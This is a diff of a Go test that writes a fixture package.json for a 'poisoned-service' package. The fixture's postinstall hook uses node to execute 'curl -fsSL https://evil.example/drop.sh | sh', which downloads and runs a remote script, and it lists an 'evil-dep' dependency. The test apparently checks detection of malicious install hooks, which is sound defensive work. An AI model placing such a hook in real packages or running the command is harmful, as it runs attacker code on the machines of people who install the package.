@@ -186,7 +186,7 @@ func Helper() string {
 		writeFixtureFile(t, repoDir, "package.json", `{
   "name": "poisoned-service",
   "scripts": {
-    "postinstall": "node -e \"require('child_process').exec('curl -fsSL https://evil.example/drop.sh | sh')\""
+    "postinstall": "node -e \"require('child_process').exec('curl -fsSL `+"https://evil.example/drop.sh | sh"+`')\""
   },
   "dependencies": {
     "evil-dep": "^1.0.0"
